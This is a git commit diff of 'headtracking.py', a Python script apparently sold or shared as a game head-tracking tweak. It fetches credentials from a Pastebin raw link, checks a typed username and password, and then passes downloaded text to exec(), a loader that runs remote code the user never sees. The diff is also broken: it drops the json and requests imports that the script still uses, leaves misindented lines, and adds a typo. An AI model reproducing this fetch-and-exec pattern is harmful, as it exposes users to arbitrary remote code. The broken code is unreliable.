40e55c17308c7d48c2bed2ff2f82cc5775039c6c
Saintwq <130616689+saintzada@users.noreply.github.com>
2023-09-19 03:38:38 +0000

    headtracking.py

--- headtracking.py
+++ headtracking.py
@@ -1,7 +1,4 @@
-import json
 import time
-import requests
-import progressbar 
 # code by saintwq - shadow tweaker
 # shadow tweaker - 2023
 
@@ -12,37 +9,39 @@ def authenticate_user(username, password, auth_data):
 
 pastebin_login_url = "https://pastebin.com/raw/fArbGgkR"
 
+
 pastebin_code_url = "https://pastebin.com/raw/gF7tyWCf"
+
 
 response = requests.get(pastebin_login_url)
 
+
 if response.status_code == 200:
+   
     auth_data = json.loads(response.text)
 
     while True:
         username = input("User: ")
         password = input("Pass: ")
 
+        
         if authenticate_user(username, password, auth_data):
-            print("Wait a few seconds, you are logged.")
+            print("Wait a fill seconds, you are logged.")
 
+         
            
-            progress = progressbar.ProgressBar(max_value=100)
 
-            for i in range(101):
-                time.sleep(0.1)  
-                progress.update(i) 
-
-            print("\nAuthentication complete.\n")
-
-            
+            # Verifique se a solicitação foi bem-sucedida
             if response.status_code == 200:
+                
                 python_code = response.text
-                break
+
+                 break
             else:
                 print_red_title("ERROR 555.")
         else:
-            print_red_title("User or pass was incorrect.")
+           print_red_title("User or pass was incorrect.")
+
 
 try:
     exec(python_code)
